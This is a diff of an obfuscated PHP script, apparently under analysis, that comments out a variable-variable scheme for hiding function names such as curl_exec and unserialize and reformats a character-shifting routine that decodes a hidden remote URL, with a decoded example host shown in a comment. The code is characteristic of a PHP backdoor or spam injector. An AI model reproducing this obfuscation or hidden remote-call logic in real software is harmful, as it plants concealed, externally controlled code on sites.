@@ -33,21 +33,22 @@ foreach($bb66b6b6b as $b666bb=>$b666bbb){
 */
 
 /* Function list */
-$flist = array("strpos","curl_close","array_unshift","curl_init","fopen","define","file_exists","array_unique","strrpos","in_array","trim","header","filemtime","preg_split","urldecode","array_pop","is_array","is_numeric","ceil","preg_match_all","extract","sprintf","range","fgets","setcookie","feof","array_merge","count","file_get_contents","strtolower","strtotime","rename","ord","curl_setopt","md5","stripos","gethostbyname","chr","explode","set_time_limit","time","shuffle","unserialize","gethostbyaddr","chmod","curl_exec","addcslashes","fclose","date","ignore_user_abort","ip2long","preg_match","ob_start","fwrite","function_exists","array_rand","is_file","touch","strtr","str_replace","substr","parse_url","preg_replace","strlen","urlencode","mt_rand","implode","phpinfo");
+//$flist = array("strpos","curl_close","array_unshift","curl_init","fopen","define","file_exists","array_unique","strrpos","in_array","trim","header","filemtime","preg_split","urldecode","array_pop","is_array","is_numeric","ceil","preg_match_all","extract","sprintf","range","fgets","setcookie","feof","array_merge","count","file_get_contents","strtolower","strtotime","rename","ord","curl_setopt","md5","stripos","gethostbyname","chr","explode","set_time_limit","time","shuffle","unserialize","gethostbyaddr","chmod","curl_exec","addcslashes","fclose","date","ignore_user_abort","ip2long","preg_match","ob_start","fwrite","function_exists","array_rand","is_file","touch","strtr","str_replace","substr","parse_url","preg_replace","strlen","urlencode","mt_rand","implode","phpinfo");
 
 //$bbbb66666=__FILE__;
 
 //$b6b6b6b6=explode("9","bbb6bbbb69bbb666b9bb6bb6b9bb66bb69b66666b9bbb66669bb6b66b669b666bbb69b66b6b69b66b6666b9b666bb66b9b6b66bbb69b666bbb669b6bb6b669b6bbb66b9b6bb6b66b9b66bbb69bbb6b6b9b6b6bb669b6b6bb6bb9bb6b6b6b69b66bbb6bb9bb6b6b9bbbbbb69b66b6bbb9b6666bb9b6b6669bbbb666bb9b6bbbb6b9bbb6b6b669bb666b69b6bb6bbb9b6bbbbb669b6bbbb69b66b6669b6bbbb669bb66bb6b69b6bbb6bbb9b66bb6b69b6b6bbb9b66b669b6bb66b69bb6669b66bb66669bb6b66bb9b6bb6bb69bbbb6669bbb6b6bbb9bbbb666b9bb66b6bb69b6bbbbb9bbb66666b9b6b66b6b9b6666b6b9bb6666bbb9b66b6bb9bbbbbb9bb6bb69b666b6669b6bb666669b6bb6b69b6b6bb9bbb6bbb669b6b666bb69b666666b69bb6b6bb9bbbbbb669b6bbb6b6b");
 
-$fkeys = array("bbb6bbbb6","bbb666b","bb6bb6b","bb66bb6","b66666b","bbb6666","bb6b66b66","b666bbb6","b66b6b6","b66b6666b","b666bb66b","b6b66bbb6","b666bbb66","b6bb6b66","b6bbb66b","b6bb6b66b","b66bbb6","bbb6b6b","b6b6bb66","b6b6bb6bb","bb6b6b6b6","b66bbb6bb","bb6b6b","bbbbbb6","b66b6bbb","b6666bb","b6b666","bbbb666bb","b6bbbb6b","bbb6b6b66","bb666b6","b6bb6bbb","b6bbbbb66","b6bbbb6","b66b666","b6bbbb66","bb66bb6b6","b6bbb6bbb","b66bb6b6","b6b6bbb","b66b66","b6bb66b6","bb666","b66bb6666","bb6b66bb","b6bb6bb6","bbbb666","bbb6b6bbb","bbbb666b","bb66b6bb6","b6bbbbb","bbb66666b","b6b66b6b","b6666b6b","bb6666bbb","b66b6bb","bbbbbb","bb6bb6","b666b666","b6bb66666","b6bb6b6","b6b6bb","bbb6bbb66","b6b666bb6","b666666b6","bb6b6bb","bbbbbb66","b6bbb6b6b");
+//$fkeys = array("bbb6bbbb6","bbb666b","bb6bb6b","bb66bb6","b66666b","bbb6666","bb6b66b66","b666bbb6","b66b6b6","b66b6666b","b666bb66b","b6b66bbb6","b666bbb66","b6bb6b66","b6bbb66b","b6bb6b66b","b66bbb6","bbb6b6b","b6b6bb66","b6b6bb6bb","bb6b6b6b6","b66bbb6bb","bb6b6b","bbbbbb6","b66b6bbb","b6666bb","b6b666","bbbb666bb","b6bbbb6b","bbb6b6b66","bb666b6","b6bb6bbb","b6bbbbb66","b6bbbb6","b66b666","b6bbbb66","bb66bb6b6","b6bbb6bbb","b66bb6b6","b6b6bbb","b66b66","b6bb66b6","bb666","b66bb6666","bb6b66bb","b6bb6bb6","bbbb666","bbb6b6bbb","bbbb666b","bb66b6bb6","b6bbbbb","bbb66666b","b6b66b6b","b6666b6b","bb6666bbb","b66b6bb","bbbbbb","bb6bb6","b666b666","b6bb66666","b6bb6b6","b6b6bb","bbb6bbb66","b6b666bb6","b666666b6","bb6b6bb","bbbbbb66","b6bbb6b6b");
 
 //echo ($x == $b6b6b6b6);
 
 /* Define function as variable variable */
+/*
 foreach($fkeys as $i=>$fkey){
     $$fkey = $flist[$i];
 };
-
+*/
 
 #echo preg_replace;
 #exit();
@@ -687,15 +688,15 @@ function l1HsDyi2($l1LgtDjH,$l1Wt,$l1gu){
 // out: http://zenjp65.okkpremote01.info/weilai0.php
 
 function decode_URL($l1qMwO){
-    $l1dgT='';
+    $l1dgT = '';
     preg_match("/([^\.]+\.)(.*)(\/.*)/",$l1qMwO,$l147sy);
     if(is_array($l147sy) && count($l147sy)==4){
-        if($l147sy[2]!=''){
-            $l1TKft0=preg_split("//",$l147sy[2],-1,PREG_SPLIT_NO_EMPTY);
+        if($l147sy[2] != ''){
+            $l1TKft0 = preg_split("//",$l147sy[2],-1,PREG_SPLIT_NO_EMPTY);
             foreach($l1TKft0 as $l1Z=>$l1lemlY6){
-                $l1TKft0[$l1Z]=chr(ord($l1lemlY6)-5);
+                $l1TKft0[$l1Z] = chr(ord($l1lemlY6)-5);
             }
-            $l1dgT=implode('',$l1TKft0);
+            $l1dgT = implode('',$l1TKft0);
         }
         $l1dgT = $l147sy[1].$l1dgT.$l147sy[3];
     }
@@ -999,9 +1000,6 @@ function l1P9LVD($l15tGX=''){
 
     if(!$l1uH) $index_file = '';
     
-
-    //echo "MAMA\n";
-    //echo $l1VQ . "\n";
 
     $l1VQ = decode_URL($l1VQ);
 
